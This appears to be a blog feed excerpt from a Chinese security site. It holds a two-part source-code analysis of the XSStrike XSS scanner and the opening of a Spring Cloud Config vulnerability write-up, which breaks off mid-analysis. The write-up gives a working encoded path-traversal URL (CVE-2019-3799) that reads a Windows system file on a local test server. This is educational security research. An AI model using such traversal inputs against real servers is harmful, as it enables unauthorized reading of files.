    <content type="html"><![CDATA[<p>XSStrike是一款优秀的开源xss漏洞扫描器。</p><a id="more"></a>  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>scan扫描作为XSStrike扫描器的核心部分，具有dom检测、waf检测、参数发现等功能，在上篇已经分析过这些功能的实现方法。接下来分析scan扫描的处理流程，分为如下部分：</p><ul><li>网页解析</li><li>过滤检测</li><li>Payload生成</li><li>XSS验证</li></ul><h2 id="网页解析"><a href="#网页解析" class="headerlink" title="网页解析"></a>网页解析</h2><p>在开始之前会根据命令配置进行dom检测、参数发现和waf检测，在上篇已经做了分析，如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830214102745.png" alt="image-20200830214102745"></p><p>接下来扫描器会进行参数替换，并将相应报文传入<code>htmlParser</code>分析，如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830214326768.png" alt="image-20200830214326768"></p><p>接下来分析下<code>htmlParser</code>函数的实现方式，代码如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830215513853.png" alt="image-20200830215513853"></p><p>首先会在响应报文中统计xss标记，接下来会对响应报文进行处理，去除注释标记，然后对所有<code>&lt;script&gt;</code>进行遍历，用于发现是否出现的<code>script</code>标签之中。</p><p>如果发现存在的话，<code>position_and_context</code>变量会记录出现位置以及出现的位置，此处则为<code>script</code>标签之中，<code>environment_details</code>则会记录闭合方式。</p><p>通过<code>replace</code>函数为发现的xss标记做替换为空处理，防止下次重复处理。</p><p>如果未在<code>script</code>标签中发现xss标记，则会进行下一阶段的处理，用于检测是否在标签之中出现，如<code>a</code>、<code>div</code>等标签，代码如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830221130030.png" alt="image-20200830221130030"></p><p>首先处理之前会先进行判断，用于判断是否所有xss已经被处理，如果已经处理则不会进入循环，提高运行效率。</p><p>同样的也会记录出现位置，记录是在哪个标签中出现的，以及闭合方式、name、value值。</p><p>当标签也没有检测到xss标记之后，会进行全局的查找，代码如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830222433071.png" alt="image-20200830222433071"></p><p>当在html页面发现时，会做一个<code>html</code>标记，如果还没有发现，有可能出现在注释之中，加下来会对注释进行检测：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830222628414.png" alt="image-20200830222628414"></p><p>检测的为原始报文<code>response</code>，检测到之后会做一个<code>commnet</code>标记。</p><p>当分析完毕之后，会将分析结果存入<code>database</code>字典，然后返回，如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830223010591.png" alt="image-20200830223010591"></p><p>最后，还有一个<code>bad_tag</code>检测，如果检测到标签为上面正则中的任何一种形式之后，会做一个<code>badTag</code>标记。</p><h2 id="过滤检测"><a href="#过滤检测" class="headerlink" title="过滤检测"></a>过滤检测</h2><p>经过<code>htmlParser</code>函数解析之后，通过<code>occurences</code>变量传入<code>filterChecker</code>函数，如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830223543487.png" alt="image-20200830223543487"></p><p><code>filterChecker</code>函数处理逻辑如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830224218882.png" alt="image-20200830224218882"></p><p>首先定义两个初始探测变量，<code>&lt;</code>和<code>&gt;</code>。</p><p>如果xss标记出现在注释中，则会加入<code>--&gt;</code>进行注释闭合测试。</p><p>如果出现在<code>script</code>中，会将闭合标记和混淆的<code>script</code>标签加入。</p><p>如果出现在属性标签之中，为<code>srcdoc</code>标签的话则会加入实体编码，因为<code>srcdoc</code>支持对实体编码的解释，然后加如闭合标记。</p><p>接下来调用<code>checker</code>函数进行检测，代码如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830224932966.png" alt="image-20200830224932966"></p><p><code>checkString</code>中会加入测试<code>payload</code>，然后发送给服务器，通过响应报文查找<code>st4r7s</code>出现的位置，根据<code>st4r7s</code>的位置截取正常测试payload的长度，通过<code>fuzz.partal_ration</code>函数对响应报文和原始paylaod进行计算。</p><p><code>fuzz.partal_ration</code>函数是一种模糊匹配算法，用于计算相似度，大致如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830230737505.png" alt="image-20200830230737505"></p><p>下面还会对原始的<code>position</code>位置进行一次运算，或者发现特殊字符并未被过滤之后权重配置为90。</p><p>取两次计算最大值返回，最终返回一个影响字典。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830231222109.png" alt="image-20200830231222109"></p><h2 id="Payload生成"><a href="#Payload生成" class="headerlink" title="Payload生成"></a>Payload生成</h2><p>Payload生成的主要函数为<code>generator</code>，代码如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830232919069.png" alt="image-20200830232919069"></p><p>可见定义了11个<code>set</code>集合，用于处理可能存在的11中情况，更加智能的生成payload，提高利用效率。</p><p>首先当上下文处于html页面之中时，会尝试获取<code>&lt;</code>和<code>&gt;</code>的影响值，存在<code>badTag</code>的话则会读取出来。如果标签结束符的影响值为100的话，也就是说后台对<code>&gt;</code>未做任何处理，测绘将<code>&gt;</code>加入的<code>ends</code>变量中，然后调用<code>genGen</code>函数生成<code>Payload</code>。</p><p>跟进下<code>genGen</code>函数：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830234709828.png" alt="image-20200830234709828"></p><p>代码会for循环自定配置或者通过之前分析生成的字符，通过字符串拼接生成对应的<code>payload</code>。</p><p>上面代码中的变量都在<code>config.py</code>文件中有所配置，部分如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830234930000.png" alt="image-20200830234930000"></p><p>当xss标记处于属性之中时，代码也会根据具体的属性生成对应的<code>payload</code>，和手动测试做标签闭合的方式如下，参考如下代码：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830235321687.png" alt="image-20200830235321687"></p><p>检测的条件太多了，就不一一分析了，如果出现了新的绕过方式或者新的标签属性，可以在此处进行配置，也可以进行全局配置，但是会增加检测的负荷。</p><h2 id="XSS验证"><a href="#XSS验证" class="headerlink" title="XSS验证"></a>XSS验证</h2><p>验证逻辑如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200831000139210.png" alt="image-20200831000139210"></p><p>遍历生成的<code>payload</code>，再做一次影响检测，当完全匹配（100）或大于等于95是表示利用成功。</p><p>如果小于95的话，还会做一次比较，<code>minEfficiency</code>为个人设置的阀值，在<code>config.py</code>中配置，可以根据实际情况来配置。当大于最小阀值时，也会进行报告。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>orz</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSStrike是一款优秀的开源xss漏洞扫描器。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://www.sys71m.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="XSS" scheme="https://www.sys71m.top/tags/XSS/"/>
    
      <category term="Python" scheme="https://www.sys71m.top/tags/Python/"/>
    
      <category term="扫描器" scheme="https://www.sys71m.top/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSStrike源码分析-上</title>
    <link href="https://www.sys71m.top/2020/08/30/XSStrike%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%B8%8A/"/>
    <id>https://www.sys71m.top/2020/08/30/XSStrike%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%B8%8A/</id>
    <published>2020-08-30T10:51:12.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>XSStrike是一款优秀的开源xss漏洞扫描器。</p><a id="more"></a>  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XSStrike是一款优秀的开源xss漏洞扫描器，项目地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/XSStrike</span><br></pre></td></tr></table></figure><p>主要分为如下功能模块：</p><ul><li>模糊测试（waf&amp;filter）</li><li>DOM XSS检测</li><li>参数发现</li><li>Photon爬虫（JS lib scan）</li><li>Blind XSS支持</li><li>Bruteforce模式</li><li>Scan模式</li></ul><p>上述列举模块部分存在一定的包含关系，如<code>scan</code>扫描时会默认进行<code>dom xss</code>检测和<code>payload</code>生成，为了方便分析各个模块的功能，而不是简单的理顺程序的运行顺序，从而将一些比较重要的模块从检测逻辑中进行了拆分。</p><p>下面就这些模块分析一下实现方式，如有分析不对的地方，欢迎指正～</p><h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p>截止目前：2020.8.29</p><p>代码分支：0ecedc1bba149931e3b32e53422d5b7c089ba9dc</p><p>version：3.1.5 Latest on 20 Dec 2019</p><p>在使用XSStrike进行dom测试的时候，项目中有几个<code>Pull request</code>并没有合并到主分支（有的<code>Pull request</code>逻辑是错误的…）,如果你在运行过程中发现并没有输出或者信息不全，可以尝试修改以下代码。</p><p>修改<code>dom.py</code>，由于<code>allControlledVariables</code>变量会在每次<code>newLine</code>循环中清空，这将导致追踪的变量失效，不能完整反映js处理流程。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829215716689.png" alt="image-20200829215716689"></p><p>修改<code>colors.py</code>，当检测到当前系统为<code>mac</code> or <code>windows</code>时，会关闭<code>colors</code>，这将导输出颜色全部配置为空，而dom检测中，有一处逻辑是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> line != newLine:</span><br><span class="line">highlighted.append(<span class="string">'%-3s %s'</span> % (str(num), line.lstrip(<span class="string">' '</span>)))</span><br></pre></td></tr></table></figure><p><code>line</code>的处理逻辑大致为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line = re.sub(r<span class="string">'\b%s\b'</span> % controlledVariable, yellow + controlledVariable + end, line)</span><br></pre></td></tr></table></figure><p>由于<code>colors</code>为<code>False</code>，<code>end</code>、<code>red</code>等参数始终为空，导致<code>line</code>始终等于<code>newLine</code>。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829220720431.png" alt="image-20200829220720431"></p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829221656543.png" alt="image-20200829221656543"></p><h2 id="模糊测试-waf-amp-filter"><a href="#模糊测试-waf-amp-filter" class="headerlink" title="模糊测试(waf&amp;filter)"></a>模糊测试(waf&amp;filter)</h2><p>waf和过滤器探测需要通过命令后<code>--fuzzer</code>来指定开启，根据文档描述：</p><blockquote><p>The fuzzer is meant to test filters and Web Application Firewalls. It is painfully slow because it sends randomly* delay requests and the delay can be up to 30 seconds. To minimize the delay, set the delay to 1 second by using the <code>-d</code> option.</p></blockquote><p>模糊测试期间会随机产生延迟，并且ip有可能发生被ban的风险，如果非必要检测的话，建议不使用此功能。</p><p><code>wafDetector</code>函数作为waf探测的主要函数，会构造一个恶意的请求，存在waf的话是肯定被检测出来的。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829173753767.png" alt="image-20200829173753767"></p><p>代码会加载一个waf指纹数据库，为下面这种格式：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"360 Web Application Firewall (360)"</span> : &#123;</span><br><span class="line"><span class="attr">"code"</span> : <span class="string">"493"</span>,</span><br><span class="line"><span class="attr">"page"</span> : <span class="string">"/wzws-waf-cgi/"</span>,</span><br><span class="line"><span class="attr">"headers"</span> : <span class="string">"X-Powered-By-360wzb"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"aeSecure"</span> : &#123;</span><br><span class="line"><span class="attr">"code"</span> : <span class="string">""</span>,</span><br><span class="line"><span class="attr">"page"</span> : <span class="string">"aesecure_denied.png"</span>,</span><br><span class="line"><span class="attr">"headers"</span> : <span class="string">"aeSecure-code"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Airlock (Phion/Ergon)"</span> : &#123;</span><br><span class="line"><span class="attr">"code"</span> : <span class="string">""</span>,</span><br><span class="line"><span class="attr">"page"</span> : <span class="string">""</span>,</span><br><span class="line"><span class="attr">"headers"</span> : <span class="string">"AL[_-]?(SESS|LB)"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当判定返回的状态码大于400时，会在返回报文的页面，状态码和headers中匹配特征数据库，按照一定的权重相加，当<code>scoure</code>不为0时，表示应用程序存在waf。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829174156851.png" alt="image-20200829174156851"></p><p>进行完waf探测之后，会对参数进行模糊测试，调用<code>fuzzer</code>方法，<code>xsschecker</code>为一个特征字符串，用于检测是否在返回页面之中：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829175813101.png" alt="image-20200829175813101"></p><p><code>fuzzer</code>函数实现方式如下，函数将参数读取并替换为<code>config</code>中预先配置的<code>fuzzes</code>字典，在每次发送是会产生一个随机延迟，防止访问次数过快导致ip被ban。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829180627102.png" alt="image-20200829180627102"></p><p>当发送<code>request</code>请求失败时，函数会有一个<code>except</code>过程，用于测试是否为发送请求过快或者waf策略导致发送失败，会在最低50秒后重试，如果仍被<code>except</code>捕获的话，log会打印ip被block的提示。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829181150756.png" alt="image-20200829181150756"></p><p>当然，当发送给成功后，会检测时候绕过了waf的过滤，检测逻辑比较简单，结果一般分为绕过、黑名单、失败。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829181804725.png" alt="image-20200829181804725"></p><h2 id="DOM-XSS检测"><a href="#DOM-XSS检测" class="headerlink" title="DOM XSS检测"></a>DOM XSS检测</h2><p>这个检测程序是执行过程中默认存在的，如果不需要<code>dom xss</code>检测，可以使用<code>--skip-dom</code>命令绕过dom检测。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829182844668.png" alt="image-20200829182844668"></p><p>接下来查看下dom的检测逻辑，与其说<code>dom xss</code>检测，不如说对js代码进行源码扫描，追踪有危险的变量和检测有危险的dom操作。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200829223314977.png" alt="image-20200829223314977"></p><p>首先定义了<code>sources</code>和<code>sinks</code>两个<code>pattern</code>，第一个是有关dom变量获取的，第二个是有关dom操作的。</p><p>定义了<code>allControlledVariables</code>全局变量，用于追踪被危险操作赋值的变量，<code>controlledVariable</code>则作为for循环内的临时变量，将初次赋值的变量存储到<code>allControlledVariables</code>之中，当识别到<code>sources</code>或<code>sinks</code>中的关键词时，会进行颜色标记，然后与原变量<code>newLine</code>进行比较：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> line != newLine:</span><br><span class="line">highlighted.append(<span class="string">'%-3s %s'</span> % (str(num), line.lstrip(<span class="string">' '</span>)))</span><br></pre></td></tr></table></figure><p>当检测到被标记时，会通过终端进行输出。</p><h2 id="参数发现"><a href="#参数发现" class="headerlink" title="参数发现"></a>参数发现</h2><p>使用<code>--params</code>命令开启此功能，参数发现是由<code>Arjun</code>项目提供的支持，项目地址：</p><blockquote><p>Find hidden parameters by parsing HTML &amp; bruteforcing.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/Arjun</span><br></pre></td></tr></table></figure><p>之所以先分析这个模块，因为后面进行爬虫或scan扫描时会用到此模块，开启此功能可以在不传入参数的情况下由扫描器自动发现。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830173106995.png" alt="image-20200830173106995"></p><p>参数的获取有两种方式，一种是配置列表，另一种为正则发现<code>input</code>标签，如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830173703675.png" alt="image-20200830173703675"></p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830173723248.png" alt="image-20200830173723248"></p><p>接下来会调用<code>checky</code>函数进行自动参数替换和报文发现：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830174806295.png" alt="image-20200830174806295"></p><h2 id="Photon爬虫-JS-lib-scan"><a href="#Photon爬虫-JS-lib-scan" class="headerlink" title="Photon爬虫(JS lib scan)"></a>Photon爬虫(JS lib scan)</h2><p>爬虫模块是由<code>Photon</code>项目提供支持的，使用<code>--crawl</code>命令来开启爬虫扫描，<code>-l</code>命令来指定爬行深度，项目地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/Photon</span><br></pre></td></tr></table></figure><p>可以使用<code>-t</code>命令防止过多线程触发安全机制或网站瘫痪。</p><blockquote><p>It is possible to make concurrent requests to the target while crawling and <code>-t</code> option can be used to specify the number of concurrent requests to make. While threads can help to speed up crawling, they might also trigger security mechanisms. A high number of threads can also bring down small websites.</p></blockquote><p>通过用户传入的<code>target</code>和<code>level</code>，程序会对网站进行相应深度的爬取，使用python的<code>concurrent.futures</code>模块进行多线程异步执行：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830141104144.png" alt="image-20200830141104144"></p><p>为防止重复爬取，会先进行集合运算，<code>storage</code>为所有爬取的url，<code>processed</code>为已经爬取的url。</p><p>逻辑与传统的爬虫类似，使用正则读取html中的潜在url，但有一点是其他爬虫功能所没有的，在爬去时会进行js漏洞扫描，用于发现之前存在漏洞的js框架版本。</p><p>核心函数为<code>main_scanner</code>，会对<code>uri</code>和<code>filecontent</code>进行检测。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830151703606.png" alt="image-20200830151703606"></p><p>跟进看一下，发现都是调用了<code>scan</code>函数和<code>check</code>函数：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830152049756.png" alt="image-20200830152049756"></p><p><code>scan</code>函数主要为漏洞发现，通过加载的漏洞数据库去匹配爬取的内容，数据库内容大致为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">"handlebars.js" : &#123;</span><br><span class="line">"bowername": [ "handlebars", "handlebars.js" ],</span><br><span class="line">"vulnerabilities" : [</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"below"</span> : <span class="string">"1.0.0.beta.3"</span>,</span><br><span class="line"><span class="attr">"severity"</span>: <span class="string">"medium"</span>,</span><br><span class="line"><span class="attr">"identifiers"</span>: &#123;</span><br><span class="line"><span class="attr">"summary"</span>: <span class="string">"poorly sanitized input passed to eval()"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"info"</span> : [ <span class="string">"https://github.com/wycats/handlebars.js/pull/68"</span> ] </span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"below"</span> : <span class="string">"4.0.0"</span>,</span><br><span class="line"><span class="attr">"severity"</span>: <span class="string">"medium"</span>,</span><br><span class="line"><span class="attr">"identifiers"</span>: &#123;</span><br><span class="line"><span class="attr">"summary"</span>: <span class="string">"Quoteless attributes in templates can lead to XSS"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"info"</span> : [ <span class="string">"https://github.com/wycats/handlebars.js/pull/1083"</span> ] </span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line">"extractors" : &#123;</span><br><span class="line">"func": [ "Handlebars.VERSION" ],</span><br><span class="line">"uri": [ "/([0-9][0-9.a-z_-]+)/handlebars(\\.min)?\\.js" ],</span><br><span class="line">"filename": [ "handlebars(?:js)?-([0-9][0-9.a-z_-]+)(.min)?\\.js" ],</span><br><span class="line">"filecontent": [ </span><br><span class="line">"Handlebars.VERSION = \"([0-9][0-9.a-z_-]+)\";", "Handlebars=\\&#123;VERSION:(?:'|\")([0-9][0-9.a-z_-]+)(?:'|\")",</span><br><span class="line">"this.Handlebars=\\&#123;\\&#125;;[\n\r \t]+\\(function\\([a-z]\\)\\&#123;[a-z].VERSION=(?:'|\")([0-9][0-9.a-z_-]+)(?:'|\")",</span><br><span class="line"><span class="string">"/\\*![\n\r \t]+handlebars v([0-9][0-9.a-z_-]+)"</span></span><br><span class="line">],</span><br><span class="line">"hashes": &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>uri</code>检测和<code>filecontent</code>分别会调用不同的正则去做检测。</p><p><code>check</code>函数主要用来漏洞分级，生成详细的漏洞报告，也是去数据库中匹配，就不多做介绍了。</p><h2 id="Blind-XSS支持"><a href="#Blind-XSS支持" class="headerlink" title="Blind XSS支持"></a>Blind XSS支持</h2><p>使用<code>--blind</code>开启Blind XSS支持。</p><blockquote><p>Using this option while crawling will make XSStrike inject your blind XSS payload defined in <code>core/config.py</code> to be injected to every parameter of every HTML form.</p></blockquote><p>Blind Xss与二次注入类似，当前操作并不会直接产生危害，或许在其他页面调用的时候会触发漏洞。</p><p>在<code>config.py</code>中定义blind xss payload，代码会在提交表单的时候将value替换为个人payload。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830160104345.png" alt="image-20200830160104345"></p><p>表单分析源自于<code>Arjun</code>项目，项目地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/Arjun</span><br></pre></td></tr></table></figure><h2 id="Bruteforce模式"><a href="#Bruteforce模式" class="headerlink" title="Bruteforce模式"></a>Bruteforce模式</h2><p>通过命令行参数<code>-f</code>或<code>--file</code>指定加载的payload，运行时会自动执行Bruteforce模式，此模式不会进行任何额外的检测，只会根据加载文件执行。</p><blockquote><p>You can load payloads from a file and check if they work. XSStrike will not perform any analysis in this mode.</p></blockquote><p>处理逻辑比较简单，就是单纯的参数替换，当响应报文中检测到<code>payload</code>时，即表示成功。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/XSStrike/image-20200830170934197.png" alt="image-20200830170934197"></p><h2 id="Scan模式"><a href="#Scan模式" class="headerlink" title="Scan模式"></a>Scan模式</h2><p>作为XSStrike扫描器的核心部分，里面涉及的东西有点多。。放到下篇文章去讲。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSStrike是一款优秀的开源xss漏洞扫描器。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://www.sys71m.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="XSS" scheme="https://www.sys71m.top/tags/XSS/"/>
    
      <category term="Python" scheme="https://www.sys71m.top/tags/Python/"/>
    
      <category term="扫描器" scheme="https://www.sys71m.top/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Spring Cloud Config漏洞分析(CVE-2019-3799、CVE-2020-5405)</title>
    <link href="https://www.sys71m.top/2020/05/10/Spring%20Cloud%20Config%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2019-3799%E3%80%81CVE-2020-5405)/"/>
    <id>https://www.sys71m.top/2020/05/10/Spring%20Cloud%20Config%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2019-3799%E3%80%81CVE-2020-5405)/</id>
    <published>2020-05-10T09:53:10.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>spring cloud config是spring cloud团队创建的一个全新项目，用来为分布式系统中的基础设施和微服务应用提供集中化的外部配置支持。</p><a id="more"></a>  <h2 id="Spring-Cloud-Config"><a href="#Spring-Cloud-Config" class="headerlink" title="Spring-Cloud-Config"></a>Spring-Cloud-Config</h2><p>先抛出三个问题：</p><ol><li>什么是微服务？</li><li>什么是Spring Cloud?</li><li>什么是Spring Cloud Config?</li></ol><p>对于微服务的理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.zhihu.com/question/65502802/answer/802678798</span><br></pre></td></tr></table></figure><p>Spring Cloud：</p><p><code>Spring Boot</code> 让我们从繁琐的配置文件中解脱了出来，而 <code>Spring Cloud</code>，它我们提供了一整套的微服务解决方案，大大的降低了微服务开发的门槛，同时也减少了开发成本。<code>Spring Cloud</code>并不是特指某个框架，它其实是一系列成熟框架的组合，使用的主要技术栈如下（图片是在网上找的，但随着技术的发展，目前有些Spring Cloud指定的技术组件停止了更新，进入了被动维护。但也有新的更好的替代者出现，如配置中心服务，Config是官方推荐组件，Nacos是阿里巴巴开源组件，目前在Spring Cloud孵化器中孵化，孵化成功后，将成为Spring Cloud官方推荐的组件之一，国内成功的案例有阿里，虎牙，爱奇艺等）：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/16d1b00653b25d09.png" alt="16d1b00653b25d09"></p><p>Spring Cloud Config：</p><p><code>spring cloud config</code>是<code>spring cloud</code>团队创建的一个全新项目，用来为分布式系统中的基础设施和微服务应用提供集中化的外部配置支持。</p><h2 id="CVE-2019-3799"><a href="#CVE-2019-3799" class="headerlink" title="CVE-2019-3799"></a>CVE-2019-3799</h2><h3 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tanzu.vmware.com/security/cve-2019-3799</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200504144804217.png" alt="image-20200504144804217"></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里分析的版本为：Spring Cloud Config 2.1.1</p><p>源码下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE</span><br></pre></td></tr></table></figure><p>在命令行运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> spring-cloud-config-server</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ../mvnw spring-boot:run</span></span><br></pre></td></tr></table></figure><p>在IDEA中运行：</p><p>先<code>Reimport</code>下<code>maven</code>依赖，然后运行<code>spring-cloud-config-server</code>文件下的<code>ConfigServerApplication.java</code>文件。</p><p>访问本地8888端口看是否正常搭建：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200504145437595.png" alt="image-20200504145437595"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>任意文件读取漏洞，尝试读取<code>C:\Windows\win.ini</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/a/b/master/..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fwin.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/JavaSec/Spring-Cloud-Config/image-20200504145605364.png" alt="image-20200504145605364"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据Spring Cloud 